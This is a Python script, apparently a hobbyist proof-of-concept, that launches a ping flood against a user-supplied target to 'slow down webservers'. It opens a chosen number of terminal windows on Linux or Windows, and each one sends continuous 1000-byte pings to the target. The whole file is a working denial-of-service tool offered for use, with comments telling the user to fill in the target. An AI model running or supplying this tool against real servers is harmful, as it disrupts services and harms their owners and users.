'''
This is a POC code, made by Buck3ts41 to 
test if ping tool can be used to 
slow down webservers.
Hope you enjoy :)

'''

###import###

import os
import time
import sys
import platform


###system-check###

try:
	from art import *
	import colorama
	from colorama import Fore
except ImportError:
	print('[-] Failed to import an external module.')
      
	
	if platform.system() == 'Linux':
		print('    trying to install missing dependencies...')
		os.system("pip install -r requirements.txt")
		print("done, restart the script")
		time.sleep(1)
	elif platform.system() == 'Windows':
		print('    trying to install missing dependencies...')
		os.system("python -m pip install -r requirements.txt")
		print("done, restart the script")
		time.sleep(1)
	
	sys.exit(1)
		
time.sleep(3)
def clear():
	if platform.system() == 'Linux':
		os.system("clear")
	if platform.system() == 'Windows':
		os.system("cls")
clear()

tprint("Ping - Flooder")
print("Script by Buck3ts41", '\n')
print("V 1.5")
if platform.system()== 'Linux':
	print("Ping Flooder running on linux", '\n')
if platform.system()== 'Windows':
	print("Ping Flooder running on Windows")
	print("Windows is now full supported", '\n')
power = "Power (1-50): "
target = input(Fore.YELLOW + "Current target: yourtarget") #edit this line with you current target
time.sleep(2)

###fun###

def start():
	if platform.system()== 'Linux':
		
		for k in range(x):
			os.system("lxterminal -e ping yourtarget -i 0.2 -s 1000") #edit this line for changing target
	if platform.system()== 'Windows':
		for k in range(x):
			
			os.system("start C:\Windows\System32\cmd.exe /k ping -t -l 1000 yourtarget") #edit this line for changing target
			
	for k in range(1000000000):
		print(Fore.GREEN + "[*] Sending 1000 bytes packets...", '\n')
		time.sleep(1)
		

###main###

x = int(input(power))

if x>20:
	warning = input(Fore.RED + "High power can effect pc performance, continue?: ")
	if warning=='y':
		start()
	if warning=='n':
		sys.exit(1)
if x<20:
	start()
